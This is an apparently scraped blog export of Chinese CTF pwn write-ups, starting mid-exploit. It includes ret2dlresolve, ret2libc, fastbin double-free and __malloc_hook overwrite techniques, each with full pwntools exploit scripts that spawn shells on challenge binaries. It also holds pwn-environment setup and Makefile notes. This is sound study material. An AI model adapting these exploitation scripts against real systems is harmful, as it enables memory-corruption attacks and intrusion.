p64(bin_sh_addr)payload2 += p64(plt_addr) #跳转到PLT[0]，push link_map后执行dl_runtime_resolvepayload2 += p64(reloc_arg) #跳转到dl_runtime_resolve后，此处为rsp+0x10，被视为reloc_argpayload2 += p8(0)*(0x100 - len(payload2))r.send(payload2)r.send(p8(0)*0x20)payload3 = p8(0)*6payload3 += p64(read_got)payload3 += p32(0x7) + p32(dynsym_off)payload3 += p64(0)payload3 += p32(system_off) + p32(0x12)payload3 += p64(0)*2payload3 += 'system\x00\x00'payload3 += '/bin/sh\x00'payload3 += p8(0)*(0x100 - len(payload3))r.send(payload3)r.interactive() x86题目提取码：ofc6 ctf wiki上的一道题，XDCTF 2015的pwn200。 x86下的结构体和x64略有不同，但利用方法大同小异。 x86下的JMPREL段对应.rel.plt节，而不是x64下的.rela.plt节 找到.rel.plt起始地址 和.dynsym起始地址 之后就是慢慢调整偏移 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'r = process('./pwn200')elf = ELF('./pwn200')#gdb.attach(r)write_plt = elf.symbols['write']write_got = elf.got['write']read_plt = elf.symbols['read']read_got = elf.got['read']start = 0x80483D0ppp_ret = 0x080485cdpop_ebp = 0x08048453leave = 0x08048481rel_plt = 0x8048318plt0 = 0x8048370dynsym = 0x80481D8dynstr = 0x8048268#构造fake地址#这里手动对齐了，所以省去了对齐操作。Elf32_Rel大小为0x10字节，所以除0x10base_addr = 0x804a800reloc_arg = base_addr + 0x28 - rel_pltdynsym_off = (base_addr + 0x38 - dynsym) / 0x10system_off = base_addr + 0x48 - dynstrbinsh_addr = base_addr + 0x50r_info = (dynsym_off &lt;&lt; 8) | 0x7log.success('reloc_arg: ' + hex(reloc_arg))log.success('dynsym_off: ' + hex(dynsym_off))log.success('system_off: ' + hex(system_off))log.success('binsh_addr: ' + hex(binsh_addr))log.success('r_info: ' + hex(r_info))bss = 0x804a020payload = 'a'*0x6c + 'a'*4payload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(base_addr)payload += p32(100)payload += p32(pop_ebp)payload += p32(base_addr)#这里可以改成base_addr-4提前平衡leave的pop操作，后面的偏移会好算点payload += p32(leave)r.recvuntil('Welcome to XDCTF2015~!')r.sendline(payload)payload = 'aaaa' #因为leave返回前有pop操作，所以这里填充4字节以平衡栈payload += p32(plt0)payload += p32(reloc_arg)payload += 'a'*4 #不需要返回地址，这里为填充字符payload += p32(binsh_addr) #plt0最后相当于调用system，所以这里为system的参数地址payload += 'a'*0x14 payload += p32(read_got)payload += p32(r_info)payload += 'a'*8payload += p32(system_off)payload += p32(0)*2payload += p32(0x12)payload += 'system\x00\x00'payload += '/bin/sh\x00'payload += 'a'*(100-len(payload))r.sendline(payload)r.interactive() 结语继ret2shellcode，ret2libc，ret2text，ret2syscall等ROP技巧之后，我以为ret2dlresolve会一样的简单，事实证明不能以貌取人。学习这个利用方法的过程中最大的感受就是它不仅利用难度提高了，对偏移计算的要求也非常苛刻，在三次跳跃的过程中，任何误差都会导致无法get shell。 参考链接： http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ https://docs.oracle.com/cd/E19683-01/816-1386/chapter6-54839/index.html https://bbs.pediy.com/thread-253833.htm https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#5reloc http://rk700.github.io/2015/08/09/return-to-dl-resolve/ https://code.woboq.org/userspace/glibc/elf/elf.h.html#660 https://blog.csdn.net/conansonic/article/details/54634142 https://www.cnblogs.com/ichunqiu/p/9542224.html https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从0开始搭建pwn环境]]></title>
    <url>%2F2019%2F08%2F29%2F%E4%BB%8E0%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[打个比赛不小心把原来glibc库搞崩了，命令都用不了了，试了好多办法没复原，干脆重新装一遍，顺便记录一下。 整个安装过程以我自己成功安装为准，可能不同的系统或者机器安装使用的命令稍有差距。此次安装的环境为ubuntu 18.04.3 TLS(windows下linux子系统)。 Ⅰ. 修改密码 修改当前用户密码：$ passwd 修改root密码：$ sudo passwd root Ⅱ. 换源 $ sudo vim /etc/apt/source.list ubuntu 16.04源 123456789101112131415161718deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse ubuntu 18.04源 1234567891011# 阿里源deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse Ⅲ. python(库)相关 python命令安装 $ sudo apt install python pip安装 $ sudo apt-get install --fix-missing python-pip pwntools安装 https://muirelle.com/2019/01/20/pwntools%E5%AE%89%E8%A3%85/ LibcSearcher安装123$ git clone https://github.com/lieanu/LibcSearcher.git$ cd LibcSearcher$ python setup.py develop Ⅳ. gdb相关 gdb安装$ sudo apt-get install gdb pwndbg安装 123$ git clone https://github.com/pwndbg/pwndbg$ cd pwndbg$ sudo ./setup.sh peda安装 123$ git clone https://github.com/longld/peda.git ~/peda$ sudo chmod 666 ~/.gdbinit$ echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit 通过修改~/.gdbinit可以更换gdb插件(用#注释来禁用插件) Ⅴ. 其他 one_gadget安装 12$ sudo apt install ruby$ sudo gem install one_gadget pwnenv写完发现以后再准备配环境的话，还是要一个一个输命令安装，麻烦得很。 索性写个脚本，一次就安完，省事。 挂在我github上了https://github.com/Muirelle/pwnenv]]></content>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Makefile学习记录]]></title>
    <url>%2F2019%2F05%2F14%2FMakefile%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[记录遇到的Makefile语法和规则。 大部分摘自《跟我一起写Makefile》——陈皓 makefile规则12target ... : prerequisitescommand 简单来说，target可以是目标文件，可执行文件，你想生成的文件，或者标签等等。prerequisites是生成target所需要的文件或目标。command就是生成target的命令，也就是make实实在在执行的命令。 这个三个参数列出来之后我们就有了一个相互依赖的关系：target这个(或多个)目标文件会依赖于prerequisites中的文件，生成规则定义在command中。也就是说如果prerequisites中有文件比target中的文件新的话，command里定义的命令就会执行。 示例 1234edit : main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o cc -o edit main.o kbd.o command.o display.o \ insert.o search.o files.o utils.o foreach函数foreach用作循环，语法： $(foreach ,,) 这个函数的意思是，把参数中的单词逐一取出放到参数所指定的变量中， 然后再执行所包含的表达式。每一次会返回一个字符串，循环过程中， 的所返回的每个字符串会以空格分隔，后当整个循环结束时，所返回的每个字符串 所组成的整个字符串（以空格分隔）将会是 foreach 函数的返回值。 所以，好是一个变量名，可以是一个表达式，而中一般会使用 这个参数来依次枚举中的单词。 示例 123names := a b c dfiles := $(foreach n,$(names),$(n).o) 上面的例子中，$(name)中的单词会被挨个取出，并存到变量“n”中，“$(n).o”每次 根据“$(n)”计算出一个值，这些值以空格分隔，后作为 foreach 函数的返回，所以， $(files)的值是“a.o b.o c.o d.o”。 注意，foreach 中的参数是一个临时的局部变量，foreach 函数执行完后，参数 的变量将不在作用，其作用域只在 foreach 函数当中。]]></content>
      <tags>
        <tag>makefile</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ciscn2019线上赛-pwn]]></title>
    <url>%2F2019%2F04%2F22%2Fciscn2019%E7%BA%BF%E4%B8%8A%2F</url>
    <content type="text"><![CDATA[大伙儿都来打比赛了，我也来凑凑热闹。 第一天跟第一个pwn题磕了一下午，始终没注意到脚本某个地方出了一点问题，导致始终得不到回显，然后卡了半天，晚上终于搞出来了。但是比赛结束之后反思了一下做题时整个思路，发现其实并不是很通畅，而且最后脚本出奇的冗长，无法直视。。。寻思着绝对还有更简单的解法，膜一下开赛5分钟就pwn掉的大佬。 your_pwndocker环境：muirelle/ciscn2019:your_pwn 解题过程：栈溢出-&gt;劫持程序流程-&gt;泄露pie-&gt;泄露got表-&gt;泄露libc-&gt;计算system&amp;binsh偏移-&gt;loop-&gt;栈溢出-&gt;ret2libc-&gt;get shell 流程分析 保护基本都开了 进main函数看看，似乎溢出不了，那就去sub_b35看看 简单分析一下，可以发现在17行和20行程序直接给我们提供了可重复利用的栈任意位置读写功能。控制v1可以读取(v4+v1)所指向内容的值。控制v2可以将v2的值写入(v4+v1)对应的地址。但是注意一点，一次只能读取和写入一字节的数据。 结合程序开的保护，最后选ret2libc。 简单的计算一下偏移之后，就可以直接劫持函数流了。 所以按照一开始的思路，一步一步往后做就行了。在本地测试的时候，每次只返回一个字节没错，但连上服务器再测试却会随机返回多于一个字节的数据，让我停在这个地方想了半天原因，多次测试之后才发现：如果本应返回3b这个数据，结果却返回了ffffff3b的话，可以直接无视掉前面的f，只取最低位一个字节就行了。不知道为啥会这样。。。 思路历程 由于程序提供了puts，所以可以用puts来打印got表的内容从而泄露libc。前提是要先得到puts的地址才能调用它。由于程序开了pie保护，所以我们最初只能拿到代码段的地址偏移，但是通过程序自带的栈内容泄露功能，我们可以直接泄露出函数的返回地址，从而得到代码段的真实地址 index_value123456789101112def index_value(index,value=-1): r.recvuntil('index\n') r.sendline(index) r.recvuntil('(hex) ') v = int(r.recvuntil('value\n').split('\n')[0], 16) log.info('value: '+hex(v)) if (value==-1): r.sendline(str(v)) else: r.sendline(str(int(value,16))) log.info('change to: '+hex(int(value,16))) return v 先写一个函数便于利用程序的读写功能。 leak_ret12345678ret_0 = struct.pack("B",int(hex(index_value('344'))[-2:],16))ret_1 = struct.pack("B",int(hex(index_value('345'))[-2:],16))ret_2 = struct.pack("B",int(hex(index_value('346'))[-2:],16))ret_3 = struct.pack("B",int(hex(index_value('347'))[-2:],16))ret_4 = struct.pack("B",int(hex(index_value('348'))[-2:],16))ret_5 = struct.pack("B",int(hex(index_value('349'))[-2:],16))ret = ret_5 + ret_4 + ret_3 + ret_2 + ret_1 + ret_0ret = ret.encode('hex') 泄露六次可以得到完整的地址。 布置rop链1234567891011121314151617181920212223242526272829303132333435363738394041#ROP_1:pop_rdi_ret: 0xd03index_value('344','3')index_value('345',ret[-4:-3]+'d')puts_off = 0x20176aputs_got_plt = hex(int(ret[:-3]+'8b6',16)+puts_off) log.success('puts_got_plt: '+puts_got_plt)#ROP_2:leak_puts_addrindex_value('352',puts_got_plt[-2:])index_value('353',puts_got_plt[-4:-2])index_value('354',puts_got_plt[-6:-4])index_value('355',puts_got_plt[-8:-6])index_value('356',puts_got_plt[-10:-8])index_value('357',puts_got_plt[-12:-10])#ROP_3:ret_to_putsindex_value('360','b0')index_value('361',ret[-4:-3]+'8')index_value('362',ret[-6:-4])index_value('363',ret[-8:-6])index_value('364',ret[-10:-8])index_value('365',ret[-12:-10])#get_out_of_the_cycleindex_value('-4','28')r.recv()#calc_system&amp;binshr.sendline('yes\n') #mind recving the '\n'puts_addr = u64(r.recvuntil('name:')[1:7]+'\x00\x00')log.success('puts_addr: '+hex(puts_addr))libc_base = puts_addr - puts_libc_offsystem_addr = system_off + libc_basebinsh_addr = binsh_off + libc_baselog.success('system_addr: '+hex(system_addr))log.success('binsh_addr: '+hex(binsh_addr))r.sendline('a') 然后再通过已知偏移计算出puts位于plt表的位置，接着调用puts，泄露got表。 got表相对于plt的偏移可以直接调试找到。 loop1234567#ROP_4:loopindex_value('368','dd')index_value('369',ret[-4:-3]+'a')index_value('370',ret[-6:-4])index_value('371',ret[-8:-6])index_value('372',ret[-10:-8])index_value('373',ret[-12:-10]) 测试得到了libc之后就可以在ROP链后面添加loop，回到main，然后ret2libc。 完整exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126from pwn import *import structcontext.log_level = 'debug'r = remote('1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com',57856)pop_rdi_ret = 0xd03puts_plt = 0x8b0printf_plt = 0x8e0puts_off = 0x20176asystem_off = 0x45390binsh_off = 0x18cd57puts_libc_off = 0x6f690def name(s): r.recvuntil('name:') r.sendline(s)def index_value(index,value=-1): r.recvuntil('index\n') r.sendline(index) r.recvuntil('(hex) ') v = int(r.recvuntil('value\n').split('\n')[0], 16) log.info('value: '+hex(v)) if (value==-1): r.sendline(str(v)) else: r.sendline(str(int(value,16))) log.info('change to: '+hex(int(value,16))) return vdef main(): name('d')#get_ret_value ret_0 = struct.pack("B",int(hex(index_value('344'))[-2:],16)) ret_1 = struct.pack("B",int(hex(index_value('345'))[-2:],16)) ret_2 = struct.pack("B",int(hex(index_value('346'))[-2:],16)) ret_3 = struct.pack("B",int(hex(index_value('347'))[-2:],16)) ret_4 = struct.pack("B",int(hex(index_value('348'))[-2:],16)) ret_5 = struct.pack("B",int(hex(index_value('349'))[-2:],16)) ret = ret_5 + ret_4 + ret_3 + ret_2 + ret_1 + ret_0 ret = ret.encode('hex') log.success('ret: '+ret)#ROP_1:pop_rdi_ret: 0xd03 index_value('344','3') index_value('345',ret[-4:-3]+'d') puts_off = 0x20176a puts_got_plt = hex(int(ret[:-3]+'8b6',16)+puts_off) log.success('puts_got_plt: '+puts_got_plt)#ROP_2:leak_puts_addr index_value('352',puts_got_plt[-2:]) index_value('353',puts_got_plt[-4:-2]) index_value('354',puts_got_plt[-6:-4]) index_value('355',puts_got_plt[-8:-6]) index_value('356',puts_got_plt[-10:-8]) index_value('357',puts_got_plt[-12:-10])#ROP_3:ret_to_puts index_value('360','b0') index_value('361',ret[-4:-3]+'8') index_value('362',ret[-6:-4]) index_value('363',ret[-8:-6]) index_value('364',ret[-10:-8]) index_value('365',ret[-12:-10])#get_out_of_the_cycleindex_value('-4','28')r.recv()#calc_system&amp;binsh r.sendline('yes\n') #mind recving the '\n' puts_addr = u64(r.recvuntil('name:')[1:7]+'\x00\x00') log.success('puts_addr: '+hex(puts_addr)) libc_base = puts_addr - puts_libc_off system_addr = system_off + libc_base binsh_addr = binsh_off + libc_base log.success('system_addr: '+hex(system_addr)) log.success('binsh_addr: '+hex(binsh_addr)) r.sendline('a') #new_ROP_1:pop_rdi_ret index_value('344','3') index_value('345',ret[-4:-3]+'d') #new_ROP_2:binsh index_value('352',hex(binsh_addr)[-2:]) index_value('353',hex(binsh_addr)[-4:-2]) index_value('354',hex(binsh_addr)[-6:-4]) index_value('355',hex(binsh_addr)[-8:-6]) index_value('356',hex(binsh_addr)[-10:-8]) index_value('357',hex(binsh_addr)[-12:-10]) # index_value('358','0') # index_value('359','0')#new_ROP_3:system index_value('360',hex(system_addr)[-2:]) index_value('361',hex(system_addr)[-4:-2]) index_value('362',hex(system_addr)[-6:-4]) index_value('363',hex(system_addr)[-8:-6]) index_value('364',hex(system_addr)[-10:-8]) index_value('365',hex(system_addr)[-12:-10]) # index_value('366','0') # index_value('367','0') index_value('-4','28') r.recv() r.sendline('yes\n') r.interactive()if __name__ == '__main__': main() 被卡很久的原因就是在一开始输入名字的时候我随便填了一个很长的字符串，而这个字符串刚好在我放置rop链的地方，并且构造rop链时偷懒，没有覆盖全8个字节，所以字符串的高字节部分没有被覆盖为0，导致rop失败。。。 doubledocker环境：muirelle/ciscn2019:double 利用main_arena泄露libc。然后fastbin attack：把malloc_hook的值覆盖为one_gadget，最后getshell 流程分析通过运行程序可以看出程序提供新建，显示，编辑，删除信息这四个功能，查看堆可以看到管理每个信息的结构体： 得到的结构体大致如下： 123456struct info&#123; int32 index; int32 len; char *content; struct info *next;&#125;; leak_libc找到new_info函数中存在UAF漏洞。红框中的代码判断即将申请的info-&gt;content是否和最近申请的info-&gt;content相同，如果是的话就不再申请新的chunk，而是直接将新的info.content指向最近申请的chunk，由于两个指针指向同一个chunk，所以造成UAF漏洞。 利用方法：申请两个内容相同的chunk，大小超过fastbin，先free掉一个chunk，其fd,bk被置为main_arena+88后打印另一个chunk，可以泄露出main_arena的值，结合libc基址，相减计算出偏移。 通过gdb.attach()可以在泄露出main_arena的同时得到libc的基址。相减得到偏移，用于计算libc基址来绕过aslr。 fastbin attack利用同一个漏洞。先申请两个相同的chunk，free掉其中一个后，edit另外一个chunk可以修改存在于fastbin中chunk的fd值，从而在下一次malloc时返回我们想要的地址指针，进而实现任意地址写。 现在我们有了libc地址，所以问题是在什么地方写可以拿到shell？这里有个知识点是覆盖__malloc_hook。 __malloc_hook是一个函数指针，如果该指针不为空，则在调用malloc时会调用它。 __malloc_hook位于main_arena上方： 所以我们的目标是利用libc得到one_gadget，然后将one_gadget放在__malloc_hook上，之后再调用malloc就会直接跳转到one_gadget，从而getshell。 所以现在需要构造一个fake chunk并且__malloc_hook要位于这个fake chunk的可控数据部分。我们不能直接把0x7f3bc9f52b00(以上图为例)作为fake chunk覆盖到fastbin的fd处，因为这样将要申请的chunk大小为0x7f3bc9f52b00-&gt;size=0x00007f3bc9c13a00，明显远大于fastbin大小，这样会导致程序崩溃。 注意到0x7f是固定的，并且0x7f也位于fastbin范围(0x20~0x80)之内，所以稍微改变一点偏移就可以将0x7f移动到fake chunk的size处。 计算偏移： 0x7f3bc9f52b10 - 0x7f3bc9f52af5 + 0x8 = 0x1b + 0x8 = 0x23 然后通过libc计算one_gadget，本地环境可以通过ldd --version查看libc版本。 覆盖后的内存分布如下： exploit12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *context.log_level = 'debug'p = process('./double')#gdb.attach(p)malloc_hook = 0def new(s): p.sendlineafter('&gt; ','1') p.sendlineafter('Your data:\n',s)def show(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index: ',index)def edit(index,s): p.sendlineafter('&gt; ','3') p.sendlineafter('index: ',index) p.sendline(s)def delete(index): p.sendlineafter('&gt; ','4') p.sendlineafter('index: ',index)def leak_libc(): global malloc_hook new('a'*0x100) new('a'*0x100) delete('0') show('1') main_arena88 = u64(p.recvn(6)+'\x00'*2) malloc_hook = main_arena88 - 88 - 0x10 libc = main_arena88 - 0x3c4b78 return libcdef fastbin_attack(fake_chunk,one_gadget): new('b'*0x60) new('b'*0x60) delete('2') payload1 = p64(fake_chunk).ljust(0x60,'\x00') edit('3',payload1) payload2 = 'a'*(0x13)+p64(one_gadget) payload2 = payload2.ljust(0x60,'\x00') new('c'*0x60) new(payload2) def main(): libc_base = leak_libc() log.success(hex(libc_base)) log.success(hex(malloc_hook)) #pause() fake_chunk = malloc_hook - 0x1b - 8 one_gadget = libc_base + 0x4526a fastbin_attack(fake_chunk,one) p.sendlineafter('&gt; ','1') p.interactive()if __name__ == '__main__': main() 参考 ：https://bbs.pediy.com/thread-250962.htm]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastbin attack]]></title>
    <url>%2F2019%2F04%2F14%2Ffastbin-attack%2F</url>
    <content type="text"><![CDATA[Fastbin double free attack fastbin_dup fastbinfastbin中的chunk是单链表结构。由于在free一个chunk时，libc只会检查此chunk是否和fastbin中第一个chunk是同一个，是的话则会报错(double free or corruption (fasttop))，所以在两次free同一个chunk间再free另一个chunk就不会被检测到。 分析123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n"); fprintf(stderr, "Allocating 3 buffers.\n"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, "1st malloc(8): %p\n", a); fprintf(stderr, "2nd malloc(8): %p\n", b); fprintf(stderr, "3rd malloc(8): %p\n", c); fprintf(stderr, "Freeing the first one...\n"); free(a); fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a); // free(a); fprintf(stderr, "So, instead, we'll free %p.\n", b); free(b); fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a); free(a); fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a); fprintf(stderr, "1st malloc(8): %p\n", malloc(8)); fprintf(stderr, "2nd malloc(8): %p\n", malloc(8)); fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));&#125; 一开始申请了3个chunk，之后free的顺序为a-&gt;b-&gt;a，此时再申请三个chunk就会发现返回的第一个和第三个指针指向的是同一个chunk，也就是a chunk。 第一次free之前，堆中chunk的情况，申请的8字节加上头部8字节再加prev_inuse一字节所以size为17字节。 第一次free后，a chunk插入到fastbin中。 第二次free后，b chunk插入到fastbin首部。 第三次free后，a chunk再次插入到fastbin首部。 三次free过程的示意图： 紧接着是三次malloc，示意图如下： 通过double free，现在得到了两个指向同一个chunk的指针。如果在第一次malloc之后，修改原本位于fd处的值为某一地址(addr_evil)，第三次malloc后，得到的指针就指向了该地址(addr_evil)，利用程序提供的功能(如果有的话)可以在该地址上写任意值。 下面一道例题具体说明如何利用double free漏洞 9447 CTF 2015: Search Engine题目： https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine 分析程序提供了输入句子和查找单词的功能，如果查找的单词存在于输入过的句子中，则可以删掉该句子。程序将以空格为间隔字符串视为单词。下面是一个例子： 1234567891011121314151617181920212223241: Search with a word2: Index a sentence3: Quit2Enter the sentence size:8Enter the sentence:aaa bb cAdded sentence1: Search with a word2: Index a sentence3: Quit1Enter the word size:1Enter the word:cFound 5: aaa bb cDelete this sentence (y/n)?yDeleted!1: Search with a word2: Index a sentence3: Quit 从堆可以看出，我们输入的句子(aaa bb c)被拆成了三个单词，每个单词作为一个word结构体依次存放在堆中。该单词和其对应句子的信息被存放在结构体中。所有的word组成了一个words_list。 1234567struct word&#123; char *word_ptr; //指向单词所在的句子中该单词的起始位置 int word_len; //单词长度 char *sentence; //指向单词所在的句子首部 int sentence_len; //句子长度 struct word *next; //指向链表中下一个word节点&#125;; //共40字节 分析了word结构体之后再看search函数就很容易了，于是我们可以得到更清晰的版本： 123456789101112131415161718192021222324252627int size;void *tmp_word;size = read_int();tmp_word = malloc(size);_input(tmp_word, size, 0);char choice;for(i = word; i; i = i-&gt;next)&#123; if(*i-&gt;sentence) &#123; if(i-&gt;word_len == size &amp;&amp; !memcmp(i-&gt;word_ptr, tmp_word, size)) &#123; __printf_chk(1LL; "Found %d: ", i-&gt;sentence_len); fwrite(i-&gt;sentence, 1uLL, i-&gt;sentence_len, stdout); putchar('\n'); puts("Delete this sentence (y/n)?"); _input(&amp;choice, 2, 1); if(choice == 'y') &#123; memset(i-&gt;sentence, 0, i-&gt;sentence_len); free(i-&gt;sentence); puts("Delete!"); &#125; &#125; &#125; free(tmp_word);&#125; search函数在查找单词的时候先通过判断sentence指向的句子是否为空，若非空则可以进一步查找并通过memset将句子内容清零，然后free掉句子对应的chunk来删除句子。但是如果我们申请足够大的一个sentence chunk，在free掉该chunk时仍会保留fd和bk指针，由于该fd，bk指针位于sentence首部，所以如再进行search查找单词，就可以直接绕过检测句子是否为空的判断，从而触发UAF漏洞。 leak_stack还有一个漏洞存在于read_int函数，大致如下： 123456789101112131415int read_int()&#123; int result; char *endptr; char nptr[48]; _input(nptr, 48, 1); result = strtol(nptr, &amp;endptr, 0); if(endptr == nptr) &#123; __printf_chk(1LL, "%s is not a valid number\n", nptr); result = read_int(); &#125; return result;&#125; 该函数接收一个至多48字节的字符串，转化成数字后返回。如果转化失败则会打印该字符串。漏洞就在于：如果输入字符串长度为48字节，那么_input函数就没有办法在该字符串最后添加空字符，从而导致在打印该字符串时泄露栈中后面的数据。 但是有一点要注意，在利用这个漏洞时，第一次泄露会失败，因为栈中字符串后面刚好是空字符中断了打印，但由于该函数是递归调用的，我们可以再次输入48字节的字符串，通过累加栈帧的方式再次泄露栈中的数据。 可以看到第一个栈帧(橙色)，后面是\x00，递归调用一次后，可以泄露出0x00007fffffffe3e0，再通过计算偏移，可以找到返回值所在的位置。 泄露出了数据 leak_libc刚才提到了UAF，触发UAF的条件是申请一个大于fastbin大小的chunk然后free掉该chunk，该chunk会被添加到unsorted bin中，并且fd和bk会指向main_arena中，通过泄露fd，bk得到main_arena，结合偏移计算出libc基址。libc中的main_arena偏移可以在libc中的malloc_trim()函数中找到。 用leak出的main_arena+88减88再减这个偏移得到的就是libc base 例如现在申请一个chunk。 free掉之后，fd和bk都指向main_arena+88中。通过程序提供的search函数泄露该值。 大致过程如下 此时用search查找4个\x00就会绕过第一个if判断，并且由于sentence已经置零，所以\x00也会在bbbb处匹配成功，从而进入第二个if语句内部，打印出fd，bk的值。 如果题目给了libc文件可以直接用ida打开找到malloc_trim函数查看main_arena偏移，由于这道题是本地环境，所以直接用ldd查看使用的libc版本再找到main_arena偏移。 double free有了stack和libc，相当于有了纸和笔，还差一个写的动作将libc中的system写到栈上。 先申请三个chunk，分别包含 ‘A’*50 + ‘ d’ ‘B’*50 + ‘ d’ ‘C’*50 + ‘ d’ 然后查找d，依次free掉三个chunk。这时的fastbin：fastbin HEAD -&gt; A -&gt; B -&gt; C -&gt; NULL 接着再查找\x00，由于C chunk的fd为空，所以无法通过第一个if，再判断B chunk，由于存在fd，第一个if被绕过，此时可以选择free掉B chunk(第二次free掉B chunk，成功double free)。此时的fastbin：fastbin HEAD -&gt; B -&gt; A -&gt; B -&gt; C -&gt; NULL 过程如图： 这时malloc一次后我们会得到B chunk，向其中写入之前泄露的stack加上偏移(变成函数返回值所在的位置)，再malloc两次，依次得到A chunk和Bchunk，此时的fastbin指向的就是刚才写入的栈的值，再次malloc，就会得到一个指向该地址的指针，用one_gadget覆盖该返回地址，在程序退出时getshell。 exploit1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env pythonfrom pwn import *#context.log_level = 'debug'r = process('./search-bf61fbb8fa7212c814b2607a81a84adf')def leak_stack(): r.recvuntil('Quit\n') r.sendline('1') r.recvuntil('size:\n') r.sendline('a'*48) r.recvuntil('number\n') r.sendline('a'*48) leak_stack = int(r.recvuntil(' is ')[-10:-4][::-1].encode('hex'),16) log.success('stack: '+hex(leak_stack)) r.sendline('1') r.recvuntil('word:\n') r.sendline('A') return leak_stackdef search(s): r.recvuntil('Quit\n') r.sendline('1') r.recvuntil('size:\n') r.sendline(str(len(s))) r.recvuntil('word:\n') r.sendline(s)def index(s): r.recvuntil('Quit\n') r.sendline('2') r.recvuntil('size:\n') r.sendline(str(len(s))) r.recvuntil('sentence:\n') r.sendline(s)def delete(c): r.recvuntil('(y/n)?') r.sendline(c)def leak_libc(): index('A'*507+' bbbb') search('bbbb') delete('y') search('\x00'*4) r.recvuntil(': ') libc_addr = u64(r.recv(8)) - 0x3c4b78 log.success('libc: '+hex(libc_addr)) delete('n') return libc_addrdef double_free(stack,libc): #malloc 3 chunk index('A'*50+' d') index('B'*50+' d') index('C'*50+' d') #fastbin -&gt; A -&gt; B -&gt; C -&gt; NULL search('d') delete('y') delete('y') delete('y') #fastbin -&gt;B -&gt; A -&gt; B -&gt; C -&gt; NULL search('\x00') delete('y') delete('n') #fastbin -&gt;B -&gt; A -&gt; B -&gt; evil -&gt; ? index(p64(stack).ljust(52)) index('A'*50+' d') index('A'*50+' d') #put one_gadget on stack one_gadget = libc + 0x45216 log.info('one_gadget: '+ hex(one_gadget)) payload = 'A'*6 + p64(one_gadget) index(payload.ljust(52))def main(): stack = leak_stack() + 0x92 libc = leak_libc() double_free(stack,libc) r.recvuntil('Quit\n') r.sendline('3') r.interactive()if __name__ == '__main__': main() 